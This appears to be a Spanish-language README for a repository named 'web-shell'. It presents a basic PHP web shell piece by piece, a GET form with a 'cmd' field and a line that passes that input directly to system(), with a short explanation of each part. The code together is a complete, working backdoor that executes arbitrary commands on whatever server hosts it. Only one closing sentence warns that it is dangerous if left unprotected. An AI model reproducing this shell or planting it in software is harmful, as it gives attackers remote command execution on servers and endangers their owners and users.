# web-shell
Este es un ejemplo básico de un shell web en PHP. Aquí está la descripción de cada parte:

```<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">``` :Este es un formulario HTML que utiliza el método GET para enviar datos. El nombre del formulario es el nombre del archivo PHP actual.

```<input type="TEXT" name="cmd" autofocus id="cmd" size="80">```: Este es un campo de entrada donde los usuarios pueden escribir comandos.

```<input type="SUBMIT" value="Execute">```: Este es un botón que, cuando se presiona, envía el formulario (y cualquier comando que el usuario haya escrito).

```<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>```: Este es el código PHP que toma el comando enviado por el usuario ($_GET['cmd']), verifica si se ha establecido y, si es así, lo ejecuta en el sistema.

Por favor, ten en cuenta que este tipo de shell web puede ser peligroso si se deja sin proteger, ya que permite la ejecución de cualquier comando en el servidor. Deberías asegurarte de que esté adecuadamente protegido y restringido a usuarios autorizados.
